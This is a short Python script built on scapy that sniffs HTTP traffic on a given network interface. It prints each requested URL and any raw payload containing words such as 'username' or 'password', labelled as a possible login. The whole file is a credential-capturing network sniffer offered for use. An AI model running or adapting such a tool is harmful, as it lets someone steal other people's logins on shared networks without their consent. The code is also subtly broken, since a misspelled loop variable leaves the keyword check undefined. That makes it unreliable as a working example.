#!/usr/bin/env python3
import argparse
import scapy.all as scapy
from scapy.layers import http

def get_arguments():
        parser = argparse.ArgumentParser()
        parser.add_argument("-i","--interface", dest="interface",help="Interface you want to listen")
        return parser.parse_args()

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		keywords = ["username","user","login","password","pass"]
		for kewyword in keywords:
			if keyword in load:
				return load

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP Request >> " + url)
		
		login_info = get_login_info(packet)
		if login_info:
			print("\n\n[+] Possible username/password > " + login_info + "\n\n")

options = get_arguments()

sniff(options.interface)

